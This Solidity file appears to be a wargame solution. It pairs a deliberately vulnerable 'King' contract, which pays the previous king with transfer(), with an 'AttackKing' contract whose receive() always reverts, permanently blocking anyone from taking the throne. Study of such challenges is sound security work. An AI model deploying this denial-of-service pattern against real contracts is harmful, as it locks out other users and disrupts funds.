// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address payable king;
    uint public prize;
    address payable public owner;

    constructor() public payable {
        owner = payable(msg.sender);
        king = payable(msg.sender);
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = payable(msg.sender);
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

contract AttackKing {
    King king;

    constructor(address payable addr) {
        king = King(addr);
    }

    function attack() external payable {
        require(
            msg.value >= king.prize(),
            "You don't send enough ETH to become king"
        );
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "Attack Failed");
    }

    receive() external payable {
        require(false, "You can't claim my throne!");
    }
}
